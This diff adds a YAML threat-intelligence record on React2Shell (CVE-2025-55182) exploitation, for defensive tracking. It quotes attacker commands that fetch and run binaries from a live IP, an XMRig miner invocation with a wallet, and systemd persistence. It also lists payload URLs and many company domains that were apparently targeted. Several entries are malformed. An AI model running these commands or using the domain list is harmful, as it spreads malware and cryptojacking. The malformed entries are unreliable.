@@ -1,0 +1,613 @@
+description: React2Shell RCE Exploit (CVE-202555182) targeting various companies including
+  Fintech, Food & Beverage, and others using a boundary string in HTTP requests.
+TTPs:
+  processes:
+  - powershell.exe
+  - system-update-service
+  - xmrig
+  - bash
+  - wget
+  commandline:
+  - waybackurls $1 | grep _next/static | cut -d / -f1,2,3 | sort -u | uniq | tee -a
+    next_target.txt
+  - --url pool.supportxmr.com:8080 --user 89Zr4vPaS8yTYRQE54tK1QGKRpsYZ6eJJYynfpfBf1zmLHECaskMPwd3wuTnQ4SYQ7QLkwVN8ur2QTQi9wkKMaCr2iXKa7j
+    --pass sx --donate-level 0
+  - cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.49.251/mips;
+    chmod +x mips; ./mips; rm -rf mips
+  - cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.49.251/mipsel;
+    chmod +x mipsel; ./mipsel; rm -rf mipsel
+  - cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.49.251/sha;
+    chmod +x sha; ./sha; rm -rf sha
+  - cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.49.251/x86;
+    chmod +x x86; ./x86; rm -rf x86
+  - cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.49.251/arm61;
+    chmod +x arm61; ./arm61; rm -rf arm61
+  - cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.49.251/686;
+    chmod +x 686; ./686; rm -rf 686
+  - cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.49.251/ppc;
+    chmod +x ppc; ./ppc; rm -rf ppc
+  - cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.49.251/586;
+    chmod +x 586; ./586; rm -rf 586
+  - cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.49.251/m68k;
+    chmod +x m68k; ./m68k; rm -rf m68k
+  - cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.49.251/dc;
+    chmod +x dc; ./dc; rm -rf dc
+  - cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.49.251/dss;
+    chmod +x dss; ./dss; rm -rf dss
+  - cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.49.251/co;
+    chmod +x co; ./co; rm -rf co
+  - cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.49.251/scar;
+    chmod +x scar; rm -rf scar
+  - /bin/bash sex.sh
+  - /bin/bash sex.sh.1
+  - /bin/bash sex.sh.2
+  - /bin/bash sex.sh.3
+  powershell: []
+  scripting_engine:
+  - bash
+  - Bash
+  registry_keys:
+  - /etc/systemd/system/system-update-service.service
+  image_load:
+  - xmrig
+  network_connections:
+  - system-update-service, pool.supportxmr.com, 8080
+  file_activity:
+  - next_target
+  - domains.txt
+  - script.sh
+  - sex.sh
+  - kal.tar.gz
+  - /etc/systemd/system/system-update-service.service
+  - xmrig-6.24.0
+  - /tmp/mips
+  - /tmp/mipsel
+  - /tmp/sha
+  - /tmp/x86
+  - /tmp/arm61
+  - /tmp/686
+  - /tmp/ppc
+  - /tmp/586
+  - /tmp/m68k
+  - /tmp/dc
+  - /tmp/dss
+  - /tmp/co
+  - /tmp/scar
+  - sex.sh.1
+  - sex.sh.2
+  - sex.sh.3
+  - jsconfig.json
+  - nextconfig.mjs
+  - package-lock.json
+  - package.json
+  - README.md
+  persistence:
+  - systemd service called system-update-service that runs the miner in the background
+    and auto-starts on boot
+  - Creating a fake systemd service to run the miner in the background and auto-start
+    on boot
+  process_relations: []
+CVEs:
+- CVE-202555182
+- CVE-2025-55182
+IOCs:
+  hashes:
+  - ddbbd528c3d0bcdd39617676c85dde33
+  ip_addresses:
+  - 154.61.77.105
+  - 177.84.130.195
+  - 209.141.49.251
+  - 185.126.82.162
+  - 212.69.85.41
+  - 45.13.227.97
+  - 45.153.34.41
+  - 196.251.66.201
+  - 38.85.206.203
+  - 217.60.248.193
+  - 16.16.83.161
+  - 40.113.172.145
+  - 48.216.241.15
+  - 54.178.19.122
+  - 68.178.168.171
+  - 52.252.226.141
+  - 80.210.220.54
+  - 3.6.167.48
+  - 130.104.233.50
+  - 195.97.50.86
+  - 195.126.82.108
+  domains:
+  - help.acorns.com
+  - support.acorns.com
+  - inscription.pixpay.fr
+  - corporate.afterpay.com
+  - newsroom.afterpay.com
+  - placement-api.afterpay.com
+  - portal-sandbox.afterpay.com
+  - www.afterpay.com
+  - placement-api.clearpay.co.uk
+  - portal.clearpay.co.uk
+  - www.clearpay.co.uk
+  - www.clearpay.com
+  - status.aiven.io
+  - news.anytask.com
+  - marketplace.auth0.com
+  - play.fga.dev
+  - jwt.io
+  - data-analytics.tools.auth0.net
+  - dev.vm.auth0.net
+  - support.digitalplayground.com
+  - support.transangels.com
+  - static.binance.us
+  - www.binance.us
+  - app.bitgo.com
+  - app.bitgo-test.com
+  - bitpanda.com
+  - coach.bitpanda.com
+  - raiffeisen.bitpanda.com
+  - www.bitpanda.com
+  - bitso.com
+  - stage.bitso.com
+  - blockchain.com
+  - login.blockchain.com
+  - prod.blockchain.com
+  - status.blockchain.com
+  - bullish.com
+  - uat.carrefouruae.com
+  - www.carrefouruae.com
+  - static.thinkglobalhealth.org
+  - app.chime.com
+  - docs-dev5.chime.com
+  - student.classdojo.com
+  - home.classdojo.com
+  - ideas.classdojo.com
+  - security.classdojo.com
+  - teach.classdojo.com
+  - tutor.classdojo.com
+  - tutoring.classdojo.com
+  - www.marketplace.classdojo.com
+  - adhoc-bugcrowd.cdn-code.org
+  - cms.coindesk.com
+  - hotfix.coindesk.com
+  - indices.coindesk.com
+  - staging.coindesk.com
+  - todayincrypto.coindesk.com
+  - a11y.ecom.np.digital.business.comcast.com
+  - static.digital.business.comcast.com
+  - static.np.digital.business.comcast.com
+  - sports.ladbrokes.com
+  - www.ladbrokes.com
+  - sports.coral.co.uk
+  - www.coral.co.uk
+  - cf-frontend-qa.mgm-svod.projects.epam.com
+  - vercel.int-aqm.hca.azure.epmc-stc.projects.epam.com
+  - beta.fivetran.com
+  - fivetran.com
+  - trust.fivetran.com
+  - cart.hostgator.com.br
+  - checkout.hostgator.com.br
+  - www.hostgator.com.br
+  - ifood.com.br
+  - parceiros.ifood.com.br
+  - 389burger.ifood.com.br
+  - app.ifood.com.br
+  - atlantico.ifood.com.br
+  - bapi.ifood.com.br
+  - beneficios.ifood.com.br
+  - benefits-microfronts.ifood.com.br
+  - billythegrill.ifood.com.br
+  - brand.ifood.com.br
+  - brasileirinho.ifood.com.br
+  - bupaqe.ifood.com.br
+  - carreiras.ifood.com.br
+  - chinadifang.ifood.com.br
+  - conhecaonext.ifood.com.br
+  - cristal.ifood.com.br
+  - dahora.ifood.com.br
+  - empresas-app.ifood.com.br
+  - espetoseciadelivery.ifood.com.br
+  - feiticomineiro.ifood.com.br
+  - homolog.ifood.com.br
+  - johnnieburger.ifood.com.br
+  - labs.ifood.com.br
+  - loja.ifood.com.br
+  - marvin.ifood.com.br
+  - menu.ifood.com.br
+  - news.ifood.com.br
+  - nws.ifood.com.br
+  - picanhariavieiralves.ifood.com.br
+  - pizzadelivery.ifood.com.br
+  - pizzariadonnamia.ifood.com.br
+  - privacidade.ifood.com.br
+  - revo-lucaodelivery.ifood.com.br
+  - separador.ifood.com.br
+  - shop.ifood.com.br
+  - sira.ifood.com.br
+  - site.ifood.com.br
+  - web-middleware.ifood.com.br
+  - ww.ifood.com.br
+  - www.zoop.com.br
+  - passport.immutable.com
+  - auth.immutable.com
+  - hub.immutable.com
+  - play.immutable.com
+  - market.immutable.com
+  - aeris.irobot.at
+  - aeris.irobot.de
+  - pay.thuisbezorgd.nl
+  - www.thuisbezorgd.nl
+  - pay.menulog.com.au
+  - www.menulog.com.au
+  - assets.takeaway.com
+  - pay.takeaway.com
+  - www.takeaway.com
+  - staging.skipthedishes.com
+  - www.skipthedishes.com
+  - pay.just-eat.dk
+  - www.just-eat.dk
+  - pay.lieferando.de
+  - www.lieferando.de
+  - pay.pyszne.pl
+  - www.pyszne.pl
+  - www.bistro.sk
+  - pay.just-eat.es
+  - www.just-eat.es
+  - pay.just-eat.co.uk
+  - www.just-eat.co.uk
+  - pay.just-eat.ch
+  - www.just-eat.ch
+  - www.10bis.co.il
+  - www.designify.com
+  - docs.keeper.io
+  - assets-sdb.kucoin.com
+  - assets-v2.kucoin.com
+  - sandbox.kucoin.com
+  - www.kucoin.com
+  - blog.lastpass.com
+  - run.li.me
+  - linktree.com
+  - qa.tr.ee
+  - tr.ee
+  - odesli.co
+  - staging.odesli.co
+  - song.link
+  - staging.song.link
+  - album.link
+  - artist.link
+  - pods.link
+  - playlist.link
+  - mylink.page
+  - fr.shop.lululemon.com
+  - shop.lululemon.com
+  - www.thatconceptstore.com
+  - uat.lego.me
+  - dev.psychobunny.me
+  - pre-prod.psychobunny.me
+  - www.psychobunny.me
+  - cards-dev.sharerewards.com
+  - connect.priceless.com
+  - hotelbookings.priceless.com
+  - music.priceless.com
+  - www.priceless.com
+  - handbook.mattermost.com
+  - infinityart-id.mgm.mo
+  - staff.monash
+  - chat.governmentjobs.com
+  - www.northwesternmutual.com
+  - blog.nubank.com.br
+  - app.nubank.com.br
+  - conta.nubank.com.br
+  - nubank.com.br
+  - explorer.api.openai.com
+  - chat.openai.com
+  - dev.gx.games
+  - dev.sandbox.gx.games
+  - gx.games
+  - sandbox.gx.games
+  - v.gx.games
+  - www.realcommercial.com.au
+  - rec.net
+  - blog.sendbird.com
+  - demos.sendbird.com
+  - desk.sendbird.com
+  - docs.sendbird.com
+  - sendbird.com
+  - m.sendbird.com
+  - brand.sophos.com
+  - artists.soundcloud.com
+  - newsroom.sprint.com
+  - es.e2e.smartshop.t-mobile.com
+  - es.t-mobile.com
+  - iotusermanager.t-mobile.com
+  - ml.t-mobile.com
+  - security.t-mobile.com
+  - www.t-mobile.com
+  - player-login.unity.com
+  - accounts.clay.earth
+  - clay.earth
+  - library.clay.earth
+  - www.clay.earth
+  - cyber.info
+  - insights-netlify.mobileaction.co
+  - insights-netlify.searchads.com
+  - resume.nanonets.com
+  - mario.kinder.com
+  - www.kinder.com
+  - my.mimeridian.com
+  - eu.front-edge.dust.tthttps://blog.dust.tthttps://docs.dust.tthttps://dust.tthttps://dust.tt.https:/
+  - fr.shop.lululemon.com
+  - shop.lululemon.com
+  - www.starbucks.com
+  - pool.supportxmr.com
+  - acorns.com
+  - afterpay.com
+  - clearpay.co.uk
+  - clearpay.com
+  - bitgo.com
+  - chime.com
+  - classdojo.com
+  - coindesk.com
+  - carrefouruae.com
+  - thinkglobalhealth.org
+  - hostgator.com.br
+  - immutable.com
+  - irobot.at
+  - irobot.de
+  - thuisbezorgd.nl
+  - menulog.com.au
+  - takeaway.com
+  - skipthedishes.com
+  - just-eat.dk
+  - lieferando.de
+  - psyzne.pl
+  - kucoin.com
+  - lastpass.com
+  - lululemon.com
+  - lego.me
+  - psychobunny.me
+  - sharerewards.com
+  - priceless.com
+  - mattermost.com
+  - mgm.mo
+  - monash
+  - governmentjobs.com
+  - northwesternmutual.com
+  - openai.com
+  - realcommercial.com.au
+  - soundcloud.com
+  - sprint.com
+  - smartshop.t-mobile.com
+  - t-mobile.com
+  - unity.com
+  - dust.tt
+  - thescore.bet
+  - hollywoodcasino.com
+  - pennplaycasino.com
+  - neon.tech
+  - bumba.global
+  - starbucks.co.jp
+  - porsche.com
+  - null-leasing.com
+  - subito.it
+  - coches.net
+  - fotocasa.es
+  - syfe.com
+  - bubly.com
+  - fritolayvarietypacks.com
+  - getsoulboost.com
+  - lifewtr.com
+  - pantryshop.com
+  - pepsidigin.com
+  - pureleaf.com
+  - refreshthenrecycle.com
+  - tastyrewards.com
+  - nba.com
+  - wnba.com
+  - gleague.nba.com
+  - itaucultural.org.br
+  - iti.itau
+  - iupp.com.br
+  - tg
+  - singlestore.com
+  - 23andme.com
+  - aeromexico.com
+  - bybit.com
+  - blueapron.com
+  - tastemade.com
+  - seamless.com
+  - currencycloud.com
+  - brightspeed.com
+  - resmed.com
+  - omnitrope.ca
+  - simplyhired.fr
+  - moov.io
+  - wf.com
+  - brio.com.au
+  - consensys.io
+  - paystack.shop
+  - cbre.eu
+  - docsend.com
+  - reclaim.ai
+  - hrs.com
+  - humo.be
+  - personio.de
+  - vtmgo.be
+  - venly.io
+  - veriff.com
+  - delio.com.pl
+  - dietly.pl
+  - packush.lite.tech
+  - lite.tech
+  - zabka.pl
+  - intigriti.com
+  - sncf-connect.com
+  - demarches-simplifiees.fr
+  - akinox.dev
+  - swapcard.com
+  urls:
+  - http://40.113.172.145/EdgeConsulting/frontend/sex.sh
+  - http://48.216.241.15/newsite/sex.sh.
+  - http://177.84.130.195/sex.sh
+  - http://177.84.130.195/sex.sh.2
+  - https://help.acorns.com
+  - https://support.acorns.com
+  - https://inscription.pixpay.fr
+  - https://corporate.afterpay.com
+  - https://newsroom.afterpay.com
+  - https://placement-api.afterpay.com
+  - https://placement-api.sandbox.afterpay.com
+  - https://placement-api.us.afterpay.com
+  - https://placement-api.us-sandbox.afterpay.com
+  - https://portal-sandbox.afterpay.com
+  - https://www.afterpay.com
+  - https://placement-api.clearpay.co.uk
+  - https://portal.clearpay.co.uk
+  - https://www.clearpay.co.uk
+  - https://www.clearpay.com
+  - https://status.aiven.io
+  - https://news.anytask.com
+  - https://marketplace.auth0.com
+  - https://play.fga.dev
+  - https://jwt.io
+  - https://data-analytics.tools.auth0.net
+  - https://dev.vm.auth0.net
+  - https://support.digitalplayground.com
+  - https://support.transangels.com
+  - https://static.binance.us
+  - https://www.binance.us
+  - https://app.bitgo.com
+  - https://app.bitgo-test.com
+  - http://bitpanda.com
+  - https://coach.bitpanda.com
+  - https://raiffeisen.bitpanda.com
+  - https://www.bitpanda.com
+  - http://bitso.com
+  - https://stage.bitso.com
+  - http://www.bitso.com
+  - http://blockchain.com
+  - https://exchange.blockchain.com
+  - https://login.blockchain.com
+  - https://prod.blockchain.com
+  - https://status.blockchain.com
+  - https://www.blockchain.com
+  - https://assets.blog-frontend.bolt.eu
+  - https://assets.careers-v3.bolt.eu
+  - https://assets.homepage.bolt.eu
+  - https://food.bolt.eu
+  - https://trust.bugcrowd.com
+  - https://bullish.com
+  - https://uat.carrefouruae.com
+  - https://www.carrefouruae.com
+  - https://static.thinkglobalhealth.org
+  - https://www.thinkglobalhealth.org
+  - https://app.chime.com
+  - https://docs-dev5.chime.com
+  - https://student.classdojo.com
+  - https://home.classdojo.com
+  - https://home-static.classdojo.com
+  - https://ideas.classdojo.com
+  - https://security.classdojo.com
+  - https://teach.classdojo.com
+  - https://teach-static.classdojo.com
+  - https://tutor.classdojo.com
+  - https://tutoring.classdojo.com
+  - https://www.marketplace.classdojo.com
+  - https://adhoc-bugcrowd.cdn-code.org
+  - https://cms.coindesk.com
+  - https://hotfix.coindesk.com
+  - https://indices.coindesk.com
+  - https://staging.coindesk.com
+  - https://todayincrypto.coindesk.com
+  - https://www.coindesk.com
+  - https://a11y.ecom.np.digital.business.comcast.com
+  - https://static.digital.business.comcast.com
+  - https://static.np.digital.business.comcast.com
+  - https://sports.ladbrokes.com
+  - https://www.ladbrokes.com
+  - https://sports.coral.co.uk
+  - https://www.coral.co.uk
+  - https://cf-frontend-qa.mgm-svod.projects.epam.com
+  - https://vercel.int-aqm.hca.azure.epmc-stc.projects.epam.com
+  - https://vercel.qa-aqm.hca.azure.epmc-stc.projects.epam.com
+  - https://beta.fivetran.com
+  - https://fivetran.com
+  - https://trust.fivetran.com
+  - http://cart.hostgator.com.br
+  - https://cart.hostgator.com.br
+  - https://checkout.hostgator.com.br
+  - https://www.hostgator.com.br
+  - http://ifood.com.br
+  - http://parceiros.ifood.com.br
+  - https://389burger.ifood.com.br
+  - https://app.ifood.com.br
+  - https://atlantico.ifood.com.br
+  - https://bapi.ifood.com.br
+  - https://beneficios.ifood.com.br
+  - https://benefits-microfronts.ifood.com.br
+  - https://billythegrill.ifood.com.br
+  - https://brand.ifood.com.br
+  - https://brasileirinho.ifood.com.br
+  - https://bupaqe.ifood.com.br
+  - https://carreiras.ifood.com.br
+  - https://chinadifang.ifood.com.br
+  - https://conhecaonext.ifood.com.br
+  - https://cristal.ifood.com.br
+  - https://dahora.ifood.com.br
+  - https://empresas-app.ifood.com.br
+  - https://espetoseciadelivery.ifood.com.br
+  - https://feiticomineiro.ifood.com.br
+  - https://homolog.ifood.com.br
+  - https://johnnieburger.ifood.com.br
+  - https://labs.ifood.com.br
+  - https://loja.ifood.com.br
+  - https://marvin.ifood.com.br
+  - https://menu.ifood.com.br
+  - https://news.ifood.com.br
+  - https://nws.ifood.com.br
+  - https://picanhariavieiralves.ifood.com.br
+  - https://pizzadelivery.ifood.com.br
+  - https://pizzariadonnamia.ifood.com.br
+  - https://privacidade.ifood.com.br
+  - https://revo-lucaodelivery.ifood.com.br
+  - https://separador.ifood.com.br
+  - https://shop.ifood.com.br
+  - https://sira.ifood.com.br
+  - https://site.ifood.com.br
+  - https://web-middleware.ifood.com.br
+  - https://ww.ifood.com.br
+  - https://www.ifood.com.br
+  - https://www.news.ifood.com.br
+  - https://www.pop.ifood.com.br
+  - https://wwww.ifood.com.br
+  - http://www.ifood.com.br
+  - https://www.zoop.com.br
+  - https://passport.immutable.com
+  - https://auth.imutable.com
+  - https://hub.immutable.com
+  - http://play.immutable.com
+  - http://market.immutable.com
+  - https://aeris.irobot.at
+  - https://aeris.irobot.de
+  - https://pay.thuisbezorgd.nl
+  - https://www.thuisbezorgd.nl
+  - http://www.thuisbezorgd.nl
+  - https://pay.menulog.com.au
+  - https://www.menulog.com.au
+  - https://assets.takeaway.com
+  - https://pay.takeaway.com
+  - https://www.takeaway.com
+  - http://www.takeaway.com
+  - staging.skipthedishes.com
+  - https://www.skipthedishes.com
+  - https://pay.just-eat.dk
+  - https://www.just-eat.dk
+  - http://154.61.77.105:8082/
+  - http://130.104.233.50/csllogin
+  - http://209.141.49.251/sexsh#1/bin/bash
+malware_families:
+- XMRig
+authors:
+- THE RAVEN FILE
+attribution: 'null'
+reference: https://theravenfile.com/2025/12/12/react2shell-exploitation-in-the-wild/comment-page-1/#comment-204
+date_of_publication: December 12, 2025
+file_creation_date: December 19, 2025
